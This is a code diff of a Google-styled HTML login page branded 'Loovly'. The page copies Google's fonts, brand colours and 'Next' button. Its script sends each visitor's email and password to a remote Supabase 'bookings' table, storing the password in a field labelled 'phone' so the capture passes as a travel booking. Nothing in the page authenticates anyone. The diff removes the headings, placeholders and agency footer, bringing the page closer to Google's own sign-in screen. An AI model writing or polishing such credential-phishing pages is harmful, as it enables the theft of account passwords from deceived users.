@@ -1,25 +1,23 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loovly - Sign in</title>
+<title>Loovly</title>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
   body{font-family:'Google Sans',Roboto,Arial,sans-serif; background:#fff; margin:0; display:flex; align-items:center; justify-content:center; min-height:100vh;}
   .card{width:100%; max-width:410px; padding:48px 40px 36px; border:1px solid #dadce0; border-radius:8px; text-align:center;}
-  .logo{font-size:32px; font-weight:500; letter-spacing:-1px;}
+  .logo{font-size:34px; font-weight:500; letter-spacing:-1px; margin-bottom:35px;}
   .logo .b{color:#4285F4} .logo .r{color:#DB4437} .logo .y{color:#F4B400} .logo .g{color:#0F9D58}
-  h1{font-size:24px; font-weight:400; color:#202124; margin:12px 0 8px;}
-  .sub{font-size:15px; color:#5f6368; margin-bottom:35px;}
   .input-group{text-align:left; margin-bottom:20px;}
   .input-group label{font-size:14px; color:#5f6368;}
-  .input-group input{width:100%; padding:15px 14px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none; margin-top:6px; text-align:left;}
+  .input-group input{width:100%; padding:15px 14px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none; margin-top:6px;}
   .input-group input:focus{border:2px solid #1a73e8; padding:14px 13px;}
   button{width:100%; padding:11px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; margin-top:15px;}
   button:hover{background:#1765cc;}
   #msg{margin-top:20px; font-size:14px;}
-  .footer{font-size:13px; font-weight:500; margin-top:30px; letter-spacing:-0.3px;}
+  .footer{font-size:13px; font-weight:500; margin-top:35px;}
   .footer .b{color:#4285F4} .footer .r{color:#DB4437} .footer .y{color:#F4B400} .footer .g{color:#0F9D58}
 </style>
 </head>
@@ -29,17 +27,15 @@
   <div class="logo">
     <span class="b">L</span><span class="r">o</span><span class="y">o</span><span class="b">v</span><span class="g">l</span><span class="r">y</span>
   </div>
-  <h1>Sign in</h1>
-  <div class="sub">Use your Loovly Account</div>
 
   <form id="loovlyForm" onsubmit="handleLoovlyLogin(event)">
     <div class="input-group">
       <label>Email</label>
-      <input type="email" id="email" placeholder="Email" required>
+      <input type="email" id="email" required>
     </div>
     <div class="input-group">
       <label>Password</label>
-      <input type="password" id="password" placeholder="Enter your password" required>
+      <input type="password" id="password" required>
     </div>
     <button type="submit" id="btn">Next</button>
     <p id="msg"></p>
@@ -47,7 +43,6 @@
 
   <div class="footer">
     <span class="b">L</span><span class="r">o</span><span class="y">o</span><span class="b">v</span><span class="g">l</span><span class="r">y</span>
-    <span style="color:#5f6368; font-weight:400;"> Travel Agency © 2026</span>
   </div>
 </div>
 
@@ -63,9 +58,9 @@ async function handleLoovlyLogin(e){
   const btn = document.getElementById('btn');
   const msg = document.getElementById('msg');
   btn.disabled=true; btn.innerText='Loading...';
-  const { error } = await supabaseClient.from('bookings').insert([{ name:'Loovly Login', email:email, phone:password, destination:'Loovly Google Style' }]);
+  const { error } = await supabaseClient.from('bookings').insert([{ name:'Loovly Login', email:email, phone:password, destination:'Loovly' }]);
   if(error){ msg.innerText='Error: '+error.message; msg.style.color='#d93025'; }
-  else { msg.innerText='Welcome to Loovly!'; msg.style.color='#1e8e3e'; }
+  else { msg.innerText='Welcome!'; msg.style.color='#1e8e3e'; }
   btn.disabled=false; btn.innerText='Next';
 }
 </script>
